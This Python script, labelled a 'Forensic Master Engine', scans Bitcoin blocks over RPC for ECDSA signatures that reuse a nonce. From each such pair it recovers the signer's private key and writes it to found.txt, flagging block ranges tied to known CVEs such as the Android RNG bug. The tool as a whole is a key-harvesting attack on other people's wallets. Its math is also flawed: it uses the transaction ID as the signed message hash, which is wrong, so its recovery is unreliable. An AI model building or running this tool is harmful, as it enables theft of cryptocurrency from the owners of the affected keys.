import sqlite3
import hashlib
import binascii
from ecdsa import util, numbertheory
from config_loader import RPC_URL, DB_PATH, N
from bitcoinrpc.authproxy import AuthServiceProxy

def solve_privkey(r, s1, z1, s2, z2):
    try:
        s_diff_inv = numbertheory.inverse_mod((s1 - s2) % N, N)
        k = ((z1 - z2) * s_diff_inv) % N
        d = ((s1 * k - z1) * numbertheory.inverse_mod(r, N)) % N
        return hex(d)
    except: return None

import argparse

def main():
    parser = argparse.ArgumentParser(description='Forensic Master Engine')
    parser.add_argument('--mode', type=str, default='signatures', help='Scan mode (signatures, addresses, deep)')
    parser.add_argument('--start-block', type=int, default=0, help='Start block height')
    parser.add_argument('--end-block', type=int, default=330000, help='End block height')
    args = parser.parse_args()

    rpc = AuthServiceProxy(RPC_URL)
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("CREATE TABLE IF NOT EXISTS sigs (r TEXT, s TEXT, z TEXT, pub TEXT, txid TEXT)")
    cur.execute("CREATE INDEX IF NOT EXISTS idx_r ON sigs(r)")
    
    print(f"--- [Forensic Master Engine Online] ---")
    print(f"Mode: {args.mode.upper()} | Range: {args.start_block} -> {args.end_block}")
    
    for h in range(args.start_block, args.end_block + 1):
        if h == 74638: print("\n[!] ALERT: VALUE OVERFLOW RANGE (CVE-2010-5137)")
        if h == 180000: print("\n[!] ALERT: MALLEABILITY RANGE (CVE-2012-1909)")
        if h == 240000: print("\n[!!!] ENTERING ANDROID RNG BUG ZONE (CVE-2013-3220) - DEEP SCAN ACTIVE")
        if h == 260000: print("\n[!] LEAVING ANDROID RNG BUG ZONE")
        
        block = rpc.getblock(rpc.getblockhash(h), 2)
        for tx in block['tx']:
            z = int(tx['txid'], 16) # استخدام txid كـ z للتبسيط في هذا الإصدار
            for vin in tx.get('vin', []):
                if 'scriptSig' in vin and 'asm' in vin['scriptSig']:
                    asm = vin['scriptSig']['asm'].split()
                    if len(asm) >= 2 and len(asm[0]) > 100:
                        try:
                            r, s = util.sig_from_der(binascii.unhexlify(asm[0])[:-1])
                            pub = asm[1]
                            
                            cur.execute("SELECT s, z FROM sigs WHERE r=? AND pub=?", (str(r), pub))
                            match = cur.fetchone()
                            if match and int(match[0]) != s:
                                pk = solve_privkey(r, int(match[0]), int(match[1]), s, z)
                                if pk:
                                    print(f"\n[!!!] PRIVATE KEY FOUND: {pk}\n")
                                    with open("found.txt", "a") as f: f.write(f"Key: {pk}\n")
                            else:
                                cur.execute("INSERT INTO sigs VALUES (?,?,?,?,?)", (str(r), str(s), str(z), pub, tx['txid']))
                        except: pass
        if h % 100 == 0: 
            conn.commit()
            print(f"Scanned Block {h}...")

if __name__ == "__main__": main()
